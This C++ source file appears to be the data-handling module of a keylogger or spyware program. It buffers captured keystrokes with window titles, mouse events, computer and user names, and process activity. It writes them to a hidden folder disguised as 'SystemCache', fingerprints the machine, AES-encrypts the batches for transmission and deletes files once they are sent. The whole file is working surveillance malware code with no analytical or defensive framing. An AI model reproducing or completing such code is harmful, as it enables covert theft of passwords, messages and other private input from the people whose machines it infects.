#include "data/DataManager.h"
#include "core/Logger.h"
#include "security/Encryption.h"
#include "security/Obfuscation.h"
#include "utils/TimeUtils.h"
#include "utils/FileUtils.h"
#include "utils/SystemUtils.h"
#include "utils/StringUtils.h"
#include <algorithm>
#include <sstream>
#include <chrono>   
#include <thread>
#include <iomanip>
#include <vector>
#include <cstdint>
#include <string>
#include "MouseHook.h"

// Obfuscated strings
constexpr auto OBF_DATA_MANAGER = OBFUSCATE("DataManager");

DataManager::DataManager(Configuration* config)
    : m_config(config), m_maxBufferSize(config->GetMaxFileSize()) {
    InitializeStorage();
}

DataManager::~DataManager() {
    FlushAllData();
}

void DataManager::InitializeStorage() {
#if PLATFORM_WINDOWS
    m_storagePath = utils::FileUtils::GetAppDataPath() + "\\SystemCache\\";
#else
    m_storagePath = utils::FileUtils::GetAppDataPath() + "/.SystemCache/";
#endif
    
    utils::FileUtils::CreateDirectories(m_storagePath);
    
    // Create initial data file
    std::string filename = "data_" + utils::TimeUtils::GetCurrentTimestamp(true) + ".bin";
    m_currentDataFile = m_storagePath + filename;
    
    LOG_INFO("Data storage initialized at: " + m_storagePath);
}

void DataManager::AddKeyData(const KeyData& keyData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Convert to string representation
    std::string dataStr = KeyDataToString(keyData);
    m_keyDataBuffer += dataStr;
    
    // Check if buffer needs flushing
    if (m_keyDataBuffer.size() >= m_maxBufferSize / 4) {
        FlushKeyData();
    }
}

void DataManager::AddMouseData(const MouseData& mouseData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = MouseDataToString(mouseData);
    m_mouseDataBuffer += dataStr;
    
    if (m_mouseDataBuffer.size() >= m_maxBufferSize / 8) {
        FlushMouseData();
    }
}

void DataManager::AddSystemData(const SystemInfo& systemInfo) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = SystemInfoToString(systemInfo);
    m_systemDataBuffer += dataStr;
    
    if (m_systemDataBuffer.size() >= m_maxBufferSize / 8) {
        FlushSystemData();
    }
}

void DataManager::AddSystemEventData(const SystemEventData& eventData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = SystemEventToString(eventData);
    m_systemEventBuffer += dataStr;
    
    if (m_systemEventBuffer.size() >= m_maxBufferSize / 16) {
        FlushSystemEvents();
    }
}

std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    FlushAllData();
    
    // Get all data files that are ready for transmission
    std::vector<std::string> dataFiles = GetDataFilesReadyForTransmission();
    std::vector<uint8_t> allData;
    
    for (const auto& file : dataFiles) {
        auto fileData = utils::FileUtils::ReadBinaryFile(file);
        if (!fileData.empty()) {
            // Add file delimiter with metadata
            std::string delimiter = "FILE_DELIMITER:" + 
                utils::FileUtils::GetFileName(file) + 
                ":SIZE:" + std::to_string(fileData.size()) + "\n";
            
            allData.insert(allData.end(), 
                          delimiter.begin(), delimiter.end());
            
            // Add file data
            allData.insert(allData.end(), fileData.begin(), fileData.end());
            
            // Mark file as transmitted
            MarkFileAsTransmitted(file);
        }
    }
    
    if (allData.empty()) {
        return {};
    }
    
    // Add metadata header
    std::string metadata = "METADATA_START\n";
    metadata += "client_id:" + utils::SystemUtils::GetSystemFingerprint() + "\n";
    metadata += "timestamp:" + utils::TimeUtils::GetCurrentTimestamp() + "\n";
    metadata += "total_size:" + std::to_string(allData.size()) + "\n";
    metadata += "file_count:" + std::to_string(dataFiles.size()) + "\n";
    metadata += "METADATA_END\n";
    
    std::vector<uint8_t> finalData(metadata.begin(), metadata.end());
    finalData.insert(finalData.end(), allData.begin(), allData.end());
    
    // Encrypt all data
    std::string encryptionKey = m_config->GetEncryptionKey();
    std::vector<uint8_t> encryptedData = security::Encryption::EncryptAES(
        finalData, encryptionKey
    );
    
    return encryptedData;
}

void DataManager::ClearData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Delete all transmitted files
    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, "*.transmitted");
    for (const auto& file : allFiles) {
        utils::FileUtils::DeleteFile(file);
    }
}

bool DataManager::HasData() const {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Check if any files are ready for transmission
    auto dataFiles = GetDataFilesReadyForTransmission();
    return !dataFiles.empty() || 
           !m_keyDataBuffer.empty() || 
           !m_mouseDataBuffer.empty() ||
           !m_systemDataBuffer.empty() ||
           !m_systemEventBuffer.empty();
}

void DataManager::FlushAllData() {
    FlushKeyData();
    FlushMouseData();
    FlushSystemData();
    FlushSystemEvents();
}

void DataManager::FlushKeyData() {
    if (!m_keyDataBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_keyDataBuffer);
        m_keyDataBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::FlushMouseData() {
    if (!m_mouseDataBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_mouseDataBuffer);
        m_mouseDataBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::FlushSystemData() {
    if (!m_systemDataBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_systemDataBuffer);
        m_systemDataBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::FlushSystemEvents() {
    if (!m_systemEventBuffer.empty()) {
        AppendToFile(m_currentDataFile, m_systemEventBuffer);
        m_systemEventBuffer.clear();
        RotateDataFileIfNeeded();
    }
}

void DataManager::AppendToFile(const std::string& path, const std::string& data) {
    std::vector<uint8_t> currentData = utils::FileUtils::ReadBinaryFile(path);
    std::string currentStr(currentData.begin(), currentData.end());
    
    currentStr += data;
    
    // Check size limit and rotate if needed
    if (currentStr.size() > m_maxBufferSize) {
        RotateDataFile();
        currentStr = data; // Start new file with current data
    }
    
    utils::FileUtils::WriteBinaryFile(
        path, 
        std::vector<uint8_t>(currentStr.begin(), currentStr.end())
    );
}

void DataManager::RotateDataFileIfNeeded() {
    static std::chrono::steady_clock::time_point lastRotation = 
        std::chrono::steady_clock::now();
    
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(now - lastRotation);
    
    if (elapsed.count() >= 5) { // 5 minutes
        RotateDataFile();
        lastRotation = now;
    }
}

void DataManager::RotateDataFile() {
    // Close current file and create new one
    std::string filename = "data_" + utils::TimeUtils::GetCurrentTimestamp(true) + ".bin";
    m_currentDataFile = m_storagePath + filename;
    
    LOG_DEBUG("Rotated data file to: " + m_currentDataFile);
}

std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
    std::vector<std::string> files;
    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, "*.bin");
    
    for (const auto& file : allFiles) {
        // Skip current active file and already transmitted files
        if (file != m_currentDataFile && 
            !utils::StringUtils::EndsWith(file, ".transmitted")) {
            
            // Check if file is old enough to transmit (at least 1 minute old)
            auto modifiedTime = utils::FileUtils::GetFileModifiedTime(file);
            auto currentTime = std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            
            if (currentTime - modifiedTime > 60000) { // 1 minute
                files.push_back(file);
            }
        }
    }
    
    return files;
}

void DataManager::MarkFileAsTransmitted(const std::string& filePath) {
    std::string newPath = filePath + ".transmitted";
    utils::FileUtils::MoveFile(filePath, newPath);
    
    // Schedule for deletion after 24 hours
    ScheduleFileDeletion(newPath, 24 * 60 * 60 * 1000);
}

void DataManager::ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs) {
    // This would be implemented with a background thread or system timer
    // For now, we'll just log the intention
    LOG_DEBUG("Scheduled file for deletion: " + filePath + 
             " in " + std::to_string(delayMs) + "ms");
}

std::string DataManager::KeyDataToString(const KeyData& data) {
    std::stringstream ss;
    ss << "KEY|" << data.timestamp << "|"
       << static_cast<int>(data.eventType) << "|"
       << data.keyCode << "|" << data.scanCode << "|"
       << static_cast<int>(data.modifiers) << "|"
       << data.windowTitle << "|" << data.keyName << "\n";
    return ss.str();
}

std::string DataManager::MouseDataToString(const MouseData& data) {
    std::stringstream ss;
    ss << "MOUSE|" << data.timestamp << "|"
       << static_cast<int>(data.eventType) << "|"
       << static_cast<int>(data.button) << "|"
       << data.position.x << "|" << data.position.y << "|"
       << data.wheelDelta << "\n";
    return ss.str();
}

std::string DataManager::SystemInfoToString(const SystemInfo& info) {
    std::stringstream ss;
    ss << "SYSINFO|" << info.timestamp << "|"
       << info.computerName << "|" << info.userName << "|"
       << info.osVersion << "|" << info.memorySize << "|"
       << info.processorInfo << "\n";
    return ss.str();
}

std::string DataManager::SystemEventToString(const SystemEventData& event) const {
    std::stringstream ss;
    ss << "SYSEVENT|" << event.timestamp << "|"
       << static_cast<int>(event.eventType) << "|"
       << event.windowTitle << "|" << event.processName << "|"
       << event.extraInfo << "\n";
    return ss.str();
}

// ==================== Batch Collection ====================

void DataManager::StartBatchCollection() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    m_batchStartTime = std::chrono::steady_clock::now();
    m_batchData.clear();
    LOG_DEBUG("Started new data collection batch");
}

bool DataManager::IsBatchReady() const {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(
        now - m_batchStartTime);
    return elapsed.count() >= 5; // 5 minutes
}

std::vector<uint8_t> DataManager::GetBatchData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Combine all collected data
    std::string batchData;
    batchData += "BATCH_START\n";
    batchData += "batch_id:" + GenerateBatchId() + "\n";
    batchData += "start_time:" + 
        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
            m_batchStartTime.time_since_epoch()).count()) + "\n";
    batchData += "end_time:" + 
        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::steady_clock::now().time_since_epoch()).count()) + "\n";
    
    // Add all collected data
    batchData += m_keyDataBuffer;
    batchData += m_mouseDataBuffer;
    batchData += m_systemDataBuffer;
    batchData += m_systemEventBuffer;
    
    batchData += "BATCH_END\n";
    
    // Clear buffers for next batch
    m_keyDataBuffer.clear();
    m_mouseDataBuffer.clear();
    m_systemDataBuffer.clear();
    m_systemEventBuffer.clear();
    
    // Encrypt the batch data
    std::string encryptionKey = m_config->GetEncryptionKey();
    std::vector<uint8_t> encryptedData = security::Encryption::EncryptAES(
        std::vector<uint8_t>(batchData.begin(), batchData.end()),
        encryptionKey
    );
    
    return encryptedData;
}

std::string DataManager::GenerateBatchId() const {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time), "%Y%m%d_%H%M%S");
    ss << "_" << utils::SystemUtils::GetSystemFingerprint();
    return ss.str();
}